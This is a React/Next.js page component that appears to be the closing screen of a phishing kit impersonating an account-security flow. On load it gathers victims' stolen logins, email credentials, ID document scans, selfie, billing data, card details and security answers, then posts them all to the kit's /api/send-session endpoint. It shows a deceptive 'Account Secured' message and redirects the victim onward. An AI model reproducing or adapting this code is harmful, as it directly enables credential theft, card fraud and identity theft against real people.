import axios from "axios";
import React, { useContext, useEffect } from "react";
import { Wrapper } from "../components/Wrapper";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";

interface SuccessfulProps {}

export const Successful: React.FC<SuccessfulProps> = ({}) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const answers = data.answers;
      const sessionId = data.sessionId;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (sessionId) {
            formData.append(`sessionId`, sessionId);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (answers) {
            formData.append(`answers`, JSON.stringify(answers));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper
      page="Successful"
      title="Account Secured"
      subTitle="Your account access has been secured and restored."
    >
      <section
        id="main-content"
        className="page-region main-content full-width"
      >
        <div className="account-table account-table-full final-flow-screen">
          <div className="account-table-content">
            <div className="account-content-container">
              {/* <header className="darkgreen-top">
                <h1>Logged Out</h1>
              </header> */}
              <div className="account-table-body">
                <header className="account-section-title clearfix checkmark">
                  <h1>You are being redirected to the login page</h1>
                </header>
                <section className="account-section no-form">
                  <form className="spacer" id="frmLogout">
                    <input
                      type="hidden"
                      name="CSRF_TOKEN"
                      defaultValue="YMBH-SSCA-CKZ5-FGOO-5THU-J7ZA-KNTF-EB2Y"
                    />
                    <input
                      type="hidden"
                      name="sessionid"
                      defaultValue="AA4U9DMWPieDlbFjFbNRrjT"
                    />
                    {/*Return to the login page with the right branding and query param*/}
                    <div className="lds-spinner">
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                      <div />
                    </div>
                  </form>
                  <div
                    className="ad-container two-ad-row clearfix"
                    style={{ margin: "20px auto 10px" }}
                  >
                    <table width="95%" style={{ padding: "auto .5%" }}>
                      <tbody>
                        <tr>
                          <td width="46.5%"></td>
                          <td width="46.5%"></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </section>
              </div>
            </div>
          </div>
        </div>
      </section>
    </Wrapper>
  );
};

export default Successful;
